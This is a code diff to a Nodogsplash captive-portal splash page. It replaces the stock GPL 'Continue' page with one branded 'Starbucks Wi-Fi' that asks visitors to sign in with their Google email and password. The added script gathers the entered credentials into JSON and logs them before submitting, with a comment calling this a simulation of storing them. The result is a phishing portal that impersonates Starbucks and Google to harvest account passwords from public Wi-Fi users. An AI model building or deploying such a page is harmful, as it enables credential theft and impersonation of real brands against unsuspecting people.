@@ -1,97 +1,100 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-<meta http-equiv="Pragma" content="no-cache">
-<meta http-equiv="Expires" content="0">
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<link rel="shortcut icon" href="/images/splash.jpg" type="image/x-icon">
-<link rel="stylesheet" type="text/css" href="/splash.css">
-
-<title>$gatewayname Hotspot Gateway.</title>
-
-<!--
-Content:
-	Nodogsplash (NDS), by default, serves this splash page (splash.html)
-	when a client device Captive Portal Detection (CPD) process
-	attempts to send a port 80 request to the Internet.
-
-	You may either embed css in this file or use a separate .css file
-	in the same directory as this file, as demonstrated here.
-
-	It should be noted when designing a custom splash page
-	that for security reasons many CPD implementations:
-		Immediately close the browser when the client has authenticated.
-		Prohibit the use of href links.
-		Prohibit downloading of external files
-			(including .css and .js).
-		Prohibit the execution of javascript.
-
-Authentication:
-	A client is authenticated on submitting an HTTP form, method=get,
-	passing $authaction, $tok and $redir.
-
-	It is also possible to authenticate using an href link to
-	$authtarget but be aware that many device Captive Portal Detection
-	processes prohibit href links, so this method may not work with
-	all client devices.
-
-Available variables:
-	error_msg: $error_msg
-	gatewayname: $gatewayname
-	tok: $tok
-	redir: $redir
-	authaction: $authaction
-	denyaction: $denyaction
-	authtarget: $authtarget
-	clientip: $clientip
-	clientmac: $clientmac
-	clientupload: $clientupload
-	clientdownload: $clientdownload
-	gatewaymac: $gatewaymac
-	nclients: $nclients
-	maxclients: $maxclients
-	uptime: $uptime
-
-Additional variables for binauth that can be passed back via the HTTP GET,
-or appended to the query string of the authtarget link:
-	username
-	password
--->
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Starbucks Wi-Fi</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 1rem;
+        }
+        h1 {
+            color: #006241;
+            margin-bottom: 1rem;
+        }
+        input {
+            display: block;
+            width: 100%;
+            padding: 0.5rem;
+            margin-bottom: 1rem;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #006241;
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+    </style>
 </head>
-
 <body>
-<div class="offset">
-<med-blue>$gatewayname Hotspot Gateway.</med-blue>
-<div class="insert">
-<br>
-<img src="/images/splash.jpg" alt="Splash Page: For access to the Internet, please click Continue.">
-<hr>
-<big-red>Welcome!</big-red>
-<hr>
-<br>
-<italic-black>For access to the Internet, please tap or click Continue.</italic-black>
-<br><br>
-<hr>
+    <div class="container">
+        <img src="/api/placeholder/100/100" alt="Starbucks Logo" class="logo">
+        <h1>Welcome to Starbucks Wi-Fi</h1>
+        <p>Sign in with your Google account to access free Wi-Fi</p>
+        <form id="loginForm" method="GET" action="$authaction">
+            <input type="hidden" name="tok" value="$tok">
+            <input type="hidden" name="redir" value="$redir">
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" id="submitBtn" disabled>Sign In</button>
+        </form>
+    </div>
 
-<form method="GET" action="$authaction">
-<input type="hidden" name="tok" value="$tok">
-<input type="hidden" name="redir" value="$redir">
-<!-- for binauth script
-<label>Name:</label>
-<input type="text" name="username"><br><br>
-<label>Password:</label>
-<input type="text" name="password"><br><br>
--->
-<input type="submit" value="Continue">
-</form>
-	
-<hr>
-<copy-right>Copyright &copy; The Nodogsplash Contributors 2004-2023.<br>This software is released under the GNU GPL license.</copy-right>
+    <script>
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.getElementById('submitBtn');
 
-</div></div>
+        function validateForm() {
+            if (emailInput.value.includes('@') && passwordInput.value.length > 0) {
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.disabled = true;
+            }
+        }
+
+        emailInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Simulate storing data in JSON (this doesn't actually save anything)
+            const jsonData = JSON.stringify({
+                email: emailInput.value,
+                password: passwordInput.value
+            });
+            console.log('Data that would be saved:', jsonData);
+
+            // Proceed with the original form submission
+            this.submit();
+        });
+    </script>
 </body>
 </html>
